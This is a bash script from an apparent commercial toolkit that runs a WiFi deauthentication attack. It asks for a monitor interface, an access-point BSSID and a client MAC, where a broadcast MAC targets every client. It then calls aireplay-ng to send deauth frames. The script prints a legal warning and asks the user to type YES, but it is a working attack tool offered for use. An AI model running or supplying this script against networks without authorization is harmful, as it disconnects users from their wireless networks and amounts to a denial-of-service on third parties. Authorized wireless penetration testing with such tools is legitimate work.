#!/usr/bin/env bash
# ==============================================================
# IT-Tool by SalgadoTech
# Script: 553.Deauth_Attack_Aireplay.sh
# ScriptID: ST-LIN-0553
# Version: 1.0
# Date: 2026-07-01
# Category: Linux > Kali Linux > WiFi Wireless
# Description: Sends deauthentication frames to a WiFi client using aireplay-ng.
# (c) 2025 SalgadoTech - All Rights Reserved
# Unauthorized distribution prohibited
# ==============================================================

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]; then
    echo -e "\033[0;31m  ERROR: This script requires root privileges.\033[0m"
    echo -e "\033[1;33m  Run with: sudo bash $(basename "$0")\033[0m"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

echo ""
echo -e '\033[0;36m\033[0m'
echo -e '\033[0;36m  _____ _____  _______ ____   ____  _\033[0m'
echo -e '\033[0;36m |_   _|_   _||__   __/ __ \ / __ \| |\033[0m'
echo -e '\033[0;36m   | |   | |     | | | |  | | |  | | |\033[0m'
echo -e '\033[0;36m   | |   | |     | | | |  | | |  | | |\033[0m'
echo -e '\033[0;36m  _| |_  | |     | | | |__| | |__| | |___\033[0m'
echo -e '\033[0;36m |_____| |_|     |_|  \____/ \____/|_____|\033[0m'
echo -e '\033[0;36m\033[0m'
echo -e '\033[0;37m  ==================================================================\033[0m'
echo -e '\033[0;36m  IT-Tool by SalgadoTech\033[0m'
echo -e '\033[0;36m  Script: 553.Deauth_Attack_Aireplay.sh\033[0m'
echo -e '\033[0;36m  ScriptID: ST-LIN-0553\033[0m'
echo -e '\033[0;36m  Version: 1.0\033[0m'
echo -e '\033[0;36m  Date: 2026-07-01\033[0m'
echo -e '\033[0;36m  Category: Linux > Kali Linux > WiFi Wireless\033[0m'
echo -e '\033[0;36m  Description: Sends deauthentication frames to a WiFi client using aireplay-ng\033[0m'
echo -e '\033[0;36m  (c) 2025 SalgadoTech - All Rights Reserved\033[0m'
echo -e '\033[0;36m  Unauthorized distribution prohibited\033[0m'
echo -e '\033[0;37m  ==================================================================\033[0m'
echo ""

if ! command -v aireplay-ng &>/dev/null; then
    echo -e "${RED}  ERROR: aireplay-ng is not installed (aircrack-ng suite).${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

echo -e "${RED}  WARNING: Deauthentication attacks are disruptive and illegal without${NC}"
echo -e "${RED}  explicit authorization. Only use on networks you own or are permitted to test.${NC}"
echo ""
read -rp "  Type YES to confirm you are authorized: " confirm

if [ "$confirm" != "YES" ]; then
    echo -e "${YELLOW}  Aborted.${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 0
fi

echo ""
read -rp "  Monitor interface (e.g. wlan0mon): " i
read -rp "  AP BSSID: " bssid
read -rp "  Client MAC (or FF:FF:FF:FF:FF:FF for all): " client

if [ -z "$i" ] || [ -z "$bssid" ] || [ -z "$client" ]; then
    echo -e "${RED}  ERROR: All fields are required.${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

if ! echo "$bssid" | grep -Eiq '^([0-9a-f]{2}:){5}[0-9a-f]{2}$'; then
    echo -e "${RED}  ERROR: Invalid AP BSSID (expected format AA:BB:CC:DD:EE:FF).${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

if ! echo "$client" | grep -Eiq '^([0-9a-f]{2}:){5}[0-9a-f]{2}$'; then
    echo -e "${RED}  ERROR: Invalid client MAC (expected format AA:BB:CC:DD:EE:FF).${NC}"
    echo ""
    read -rp "Press Enter to exit..." _
    exit 1
fi

echo ""
echo -e "${YELLOW}  Sending deauth frames on '$i'...${NC}"
aireplay-ng --deauth 10 -a "$bssid" -c "$client" "$i"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}  SUCCESS: Deauth frames sent.${NC}"
else
    echo -e "${RED}  ERROR: aireplay-ng failed.${NC}"
fi

echo ""
read -rp "Press Enter to exit..." _
